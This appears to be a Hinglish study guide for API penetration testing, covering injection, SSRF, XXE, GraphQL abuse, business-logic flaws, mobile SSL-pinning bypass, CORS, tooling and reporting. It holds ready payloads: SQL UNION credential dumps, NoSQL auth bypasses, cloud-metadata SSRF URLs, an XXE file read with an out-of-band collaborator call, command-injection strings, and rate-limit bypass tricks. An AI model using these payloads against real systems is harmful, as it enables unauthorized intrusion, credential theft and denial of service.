## 💉 Module 4: Modern Injections & Resource Abuse (SQL, NoSQL, SSRF, XXE, Unrestricted Consumption)

### Topic 4.1: SQL Injection
* **Fuzzing Approach:** (Reference: **Page 10-11**)
    * Request ko Intruder mein bhejo. Parameter ke aage `$1$` mark karo.
    * Payloads mein se **"Fuzzing - SQL Injection"** select karo.
    * Attack karo aur status code/length mein change dhoondo.
* **Manual Exploitation:**
    * Agar `id=5` vulnerable hai, toh `UNION SELECT` try karo:
    * `GET /v1/001.php?id=5+UNION+SELECT+username,password,null,null+from+users--` (Reference: **Page 11**)
* **Second-order SQLi:** Pehle payload database mein store karwao (e.g., signup mein `' OR 1=1;--` username se), aur baad mein kisi dusre feature mein use trigger karo.

### Topic 4.2: NoSQL Injection (MongoDB)
* **Tech Detection:** (Reference: **Page 11-12**)
    * Error message mein `MongoError`, `E11000` dhoondo.
    * Response mein `_id`, `ObjectId` dhoondo.
* **Authentication Bypass (Boolean-based):** (Reference: **Page 12-13**)
    * **Original Query:** `db.users.find({"username": username, "password": password})`
    * **Payload:**
        * Username: `admin`
        * Password: `{"$ne": null}`
    * **Final Query:** `db.users.find({"username": "admin", "password": {"$ne": null}})`
    * Matlab "jiska username admin ho aur password null na ho". Ye hamesha true hai. Bypass!
* **Bypass both fields:** (Reference: **Page 13**)
    * `username: {"$exists": true}, password: {"$ne": null}`
* **Command Injection:** (Reference: **Page 14**)
    * `$gt`: greater than. `username: {"$gt": ""}` -> Saare users jinka username empty string se bada hai (practically sabhi).
    * `$where`: JavaScript execute karo. `username: {"$where": "this.username == 'admin'"}`. Ismein sleep payloads bhi daal sakte ho: `{"$where": "sleep(5000)"}`.
* **Blind NoSQLi:** Response time ya error based conditions se data extract karo.

### Topic 4.3: SSRF (Server-Side Request Forgery)
* **Kaha dhoondo:** Endpoints jo URL accept karte hain (e.g., `?image_url=...`, `webhook=...`, `?file=...`, `?url=...`, `?path=...`).
* **Payloads:**
    * Internal cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS) ya `http://metadata.google.internal/` (GCP). Isse IAM credentials mil sakte hain.
    * Internal services: `http://localhost:8080/`, `http://127.0.0.1/health`, `http://192.168.1.1/admin`.
    * Port scan: `http://localhost:22`, `http://localhost:3306`.
* **Blind SSRF:** Agar response mein data nahi dikhta, toh Burp Collaborator ya `https://webhook.site` use karo. Apna URL bhejo aur dekho ki server ne request ki ya nahi.
* **Webhook SSRF:** Webhook URL field mein apna collaborator URL daalo.

### Topic 4.4: XXE (XML External Entity)
* **Kaha dhoondo:** APIs jo `Content-Type: application/xml` accept karti hain ya `Content-Type: application/json` ke saath bhi XML data accept kar leti hain.
* **Payload (File Read):**
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <product>&xxe;</product>
    ```
* **Blind XXE:** Out-of-band data exfiltration.
    ```xml
    <!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://COLLABORATOR_URL"> %xxe;]>
    ```

### Topic 4.5: Command Injection
* **Kaha dhoondo:** Endpoints jo system commands ki tarah behave karte hain (e.g., `?host=google.com`, `?ip=8.8.8.8`, `?file=test.pdf`).
* **Payloads:**
    * `; ls -la`
    * `| whoami`
    * `$(id)`
    * `` `id` ``
    * `|| ping -c 10 127.0.0.1`

### Topic 4.6: SSTI (Server-Side Template Injection)
* **Kaha dhoondo:** Response mein user input reflect ho raha ho, especially error messages ya profile pages mein.
* **Payloads:** `{{7*7}}`, `${7*7}`, `{{7*'7'}}`. Agar response mein `49` ya `7777777` dikhe, toh SSTI hai.
* **RCE:** Fir template engine ke hisaab se RCE payloads daalo (Jinja2, Freemarker, etc.).

### Topic 4.7: Unrestricted Resource Consumption (OWASP API 4:2023)
* **Pagination Abuse:**
    * Endpoint: `GET /api/products?limit=10` ko change karo `limit=1000000` ya `limit=999999999`.
    * Agar server saare products ek saath bhejne ki koshish karta hai, toh memory exhaust ho sakti hai (DoS).
* **Large Payloads:**
    * JSON body mein 10MB ka random string bhejo. Agar server parse karne ki koshish karega, CPU usage high ho jayega.
* **Array Overflow:** JSON array mein 1 lakh objects bhej do `[{"id":1}, {"id":2}, ...]`.
* **Rate Limit Bypass:** (Iska detail **Module 5** mein hai, par yahan bhi mention kar do ki resource consumption se bhi DoS ho sakta hai).

### Topic 4.8: Prototype Pollution (Node.js Special)
Kaha dhoondo: Node.js/Express APIs mein jahan JSON objects merge ya clone ho rahe hon.

Method: Attacker base object (prototype) ko "pollute" karta hai taaki poore application ka behavior change ho jaye.

Payload:

JSON
{
  "__proto__": {
    "isAdmin": true
  }
}
Impact: Isse aap bina admin rights ke unauthorized actions kar sakte ho ya server crash (DoS) kar sakte ho.

### Topic 4.9: Insecure Deserialization (Java/C# Focus)
Kaha dhoondo: APIs jo binary serialized data ya complex objects accept karti hain.

Scenario: Server jab data ko wapas object banata hai (Deserialize), toh wo usmein chhupa malicious code execute kar deta hai.

Attack: ysoserial tool use karke payload generate karo aur request mein bhej do.

Impact: Seedha RCE (Remote Code Execution)—matlab server aapke kabze mein.

---

## 🚀 Module 5: GraphQL Security (Modern APIs)

### Topic 5.1: GraphQL Discovery
* Endpoints: `/graphql`, `/graphiql`, `/playground`, `/v1/graphql`.
* **Introspection Query:** GraphQL endpoint ka poora schema nikal lo. Ye sabse pehla step hai.
    ```graphql
    query {
      __schema {
        types {
          name
          fields {
            name
            type {
              name
              kind
            }
          }
        }
      }
    }
    ```
    Agar introspection off hai, toh **field suggestions** se bhi hints mil sakte hain. Galat field name likho to suggestion mein correct field name aa sakta hai.

### Topic 5.2: GraphQL Attacks
* **Batching Attack:** Ek request mein 100+ queries bhej kar rate limit bypass aur resource exhaustion.
    ```graphql
    query q1 { user(id:1) { name } }
    query q2 { user(id:2) { name } }
    # ... up to 100 queries
    ```
* **Deep Recursion (Cyclical Queries):** Aisi query bhejo ki database crash ho jaye.
    ```graphql
    query {
      user {
        friends {
          user {
            friends {
              user {
                friends {
                  name
                }
              }
            }
          }
        }
      }
    }
    ```
* **Directive-based Attacks:** `@include` aur `@skip` directives ko manipulate karke condition bypass karna.
* **GraphQL IDOR:** Predictable global IDs ka use karke dusre objects access karna.

---

## 🔄 Module 6: Business Logic & Rate Limiting

### Topic 6.1: Workflow Bypass
* **Scenario:** Signup process -> (1) Register (2) Verify OTP (3) Success.
* **Attack:** Step 1 complete karne ke baad, seedha Step 3 ka endpoint call karo (`/api/success`). Agar skip kar diya, vulnerable hai.
* **Force Browsing:** Step 2 ke baad Step 3 ka URL guess karo.

### Topic 6.2: Race Conditions (Turbo Intruder)
* **Scenario:** Coupon code ek baar use ho sakta hai. Ek hi second mein 50 requests bhej do us coupon ke saath. Agar 2 baar apply ho gaya, Race Condition hai.
* **Scenario:** Wallet mein se paisa nikalna. Balance check hone aur deduct hone ke beech mein multiple requests bhejo.
* **Tool:** Burp Suite ka **Turbo Intruder** extension.
    * Python script likho jo 50+ concurrent requests bheje.

### Topic 6.3: Rate Limiting Bypass
* **IP Rotation:**
    * `X-Forwarded-For: <random IP>` header rotate karo. Burp mein `FoxyProxy` ya custom script use karo.
    * VPN ya proxy chains use karo.
* **Parameter Pollution:** Har request mein ek extra random parameter daal do (`&rand=123`, `&rand=456`). Isse server ki fingerprinting fail ho sakti hai.
* **Endpoint Swapping:** Agar `/api/login` par rate limit hai, toh `/api/v2/login` ya `/api/auth/login` try karo.
* **Slow down:** Thoda slow request bhejo, threshold ke neeche raho.

### Topic 6.4: Financial Logic Flaws
* **Negative Values:** `quantity: -1` ya `price: -100` bhej kar dekho. Total negative ho sakta hai.
* **Currency Manipulation:** Product price USD 10 hai. Currency code change karo INR 10 par. Agar conversion nahi hua, toh sasta mil gaya.
* **Decimal Precision:** `price: 10.9999999999` bhej kar rounding errors exploit karo.

---

## 🌐 Module 7: Infrastructure & Misconfiguration (Mobile & Cloud)

### Topic 7.1: Mobile API Interception (SSL Pinning Bypass)
* **Problem:** Mobile app mein Burp ka certificate kaam nahi karta (app apna certificate check karti hai).
* **Solution 1 (Objection/Frida):**
    * Install Frida and Objection.
    * `objection --gadget "app.name" explore --startup-command "android sslpinning disable"`
* **Solution 2 (Burp + Proxy):** Android emulator mein proxy set karo aur `ProxyDroid` jaise app se traffic forward karo.
* **Hardcoded Keys:** APK decompile karo (`apktool`), `strings.xml` aur source code mein API secrets, Firebase keys, aur endpoints dhoondo.

### Topic 7.2: Cloud-Native API Risks (AWS/Azure/GCP)
* **Metadata SSRF:** SSRF se `http://169.254.169.254/latest/meta-data/iam/security-credentials/` hit karo. Temporary AWS keys mil jayenge.
* **S3 Bucket Leakage:** API endpoints jo files serve karte hain, unmein S3 URLs leak ho rahe hain? Response mein `https://s3.amazonaws.com/bucket-name/file.jpg` dikhta hai toh bucket public ho sakti hai.
* **Serverless (Lambda) Risks:** Event injection. Manipulated JSON event se lambda function ka logic change kar do.

### Topic 7.3: CORS (Cross-Origin Resource Sharing) Misconfiguration
* **CORS Wildcard:** `Access-Control-Allow-Origin: *` ke saath `Access-Control-Allow-Credentials: true` ho toh **critical** hai. Koi bhi malicious site user ka data API se chura sakti hai.
    * **Test:** Request mein `Origin: https://evil.com` daalo. Agar response mein `Access-Control-Allow-Origin: https://evil.com` aur `Allow-Credentials: true` milta hai, toh vulnerable.
* **Null Origin Bypass:** `Origin: null` bhej kar dekho. Kai baar server `null` ko allow kar deta hai.
* **Preflight Bypass:** `OPTIONS` request ka response check karo.

### Topic 7.4: API Versioning & Deprecation
* **Debug Endpoints:** `/api/debug`, `/api/test`, `/api/health`, `/api/status` try karo. Production mein ye nahi hone chahiye.
* **Deprecated Versions:** `/v1/` mein vulnerabilities hain jo `/v2/` mein fix hain. Try karo `/v1/` endpoints ko.

### Topic 7.5: Security Headers
* Check karo: `Strict-Transport-Security` (HSTS), `Content-Security-Policy` (CSP), `X-Content-Type-Options` present hain ya nahi.
* **Verbose Error Messages:** Galat input daal kar dekho. Stack trace, DB version, internal paths leak ho rahe hain?

### Topic 7.6: API Cache Poisoning
  Kaha dhoondo: APIs jo CDNs (Cloudflare) ya Caching Layers (Redis/Varnish) use karti hain.

  Method: Aisi request bhejo jisme "Unkeyed Headers" (jaise X-Forwarded-Host) malicious ho. Agar server us malicious response ko cache kar leta hai, toh har user ko wahi dikhega.

  Example: Attacker cache mein apni malicious JS file path save karwa deta hai, aur legitimate users ko wo file serve hone lagti hai.

---

## 🔗 Module 8: Webhook Security & Microservices

### Topic 8.1: Webhook Security
* **Scenario:** Tumhari app kisi third-party service ko webhook bhejti hai (e.g., payment success par).
* **Lack of Signature Verification:** Agar incoming webhook (dusri service se tumhari app par aane wala) verify nahi hota, toh attacker fake webhook bhej kar event trigger kar sakta hai (e.g., "payment success").
* **Replay Attacks:** Webhook request mein `timestamp` aur `nonce` missing hai? Attacker same request baar-baar bhej sakta hai.
* **SSRF via Webhook:** Webhook URL field mein internal IP daal kar server ko request karwado.

### Topic 8.2: Microservices Communication
* **Service-to-Service Auth:** Internal APIs bina authentication ke accessible hain? Try karo `service-a.internal` ya `service-b:8080` ko.
* **mTLS Misconfig:** Agar mutual TLS hai, toh certificate check bypass ho sakta hai?

---

## ⚙️ Module 9: Professional Tooling & Automation

### Topic 9.1: Burp Suite Mastery
* **Scope Configuration:** Sirf target domain ka traffic dekhne ke liye (Reference: **Page 5, 16-17**)
    1.  Target tab -> Scope -> Add domain.
    2.  Proxy -> HTTP History -> Filter -> "Show only in-scope items".
* **Color Coding:** Kisi bhi request par right-click -> "Add to scope/Highlight" kar ke important requests ko mark karo. (Reference: **Page 4**)
* **Intercept Response Rules:** Settings mein "Intercept response based on rules" enable karo. (Reference: **Page 17**)

### Topic 9.2: Burp Extensions (Must-Haves)
* **Autorize:** Automated authorization testing (BOLA dhoondne ke liye). Low-privilege user ke session ke saath chalao, high-privilege endpoints access ho rahe hain kya?
* **AuthMatrix:** Complex role-based access control (RBAC) test karne ke liye.
* **JSON Web Tokens:** JWT ko intercept karte hi edit karne ke liye.
* **GraphQL Raider / InQL:** GraphQL testing ke liye.
* **Turbo Intruder:** Race conditions aur massive rate limit testing.
* **Backslash Powered Scanner:** Advanced parameter parsing.
* **Logger++:** Advanced traffic logging.

### Topic 9.3: CLI & Scripting
* **Postman / Newman:** API collections bana kar Newman se automate karo. Regression testing ke liye useful.
* **Python Requests:** Custom scripts for complex logic attacks (Race conditions, custom payloads).
* **Nuclei:** API-specific templates se automatic CVE scan karna. `nuclei -u https://api.target.com -t ~/nuclei-templates/api/`
* **Ffuf / Gobuster:** API route discovery ke liye custom API wordlists ke saath.

### Topic 9.4: Reporting (CVSS & PoC)
* **CVSS Score:** Vulnerbility ki severity nikalne ke liye (Base Score: 3.0 - Low, 7.0+ High). Use `https://www.first.org/cvss/calculator/`.
* **PoC Writing:** Steps clearly likho, screenshot do, impact batao, fix suggestion do.
* **Remediation Guidance:** Framework-specific fix suggestions (e.g., Spring Boot mein `@PreAuthorize`, Express mein middleware).

### Topic 9.5: Remediation Timelines (Industry Standards)
  Note: Professional report mein sirf bug batana kaafi nahi hai, fix karne ka time bhi dena hota hai:

  Critical (P1): Fix within 7 Days (e.g., RCE, BOLA).

  High (P2): Fix within 30 Days (e.g., Stored XSS, Broken Auth).

  Medium (P3): Fix within 90 Days (e.g., CSRF, Misconfigurations).

  Low (P4): Best effort (e.g., Missing security headers).

---


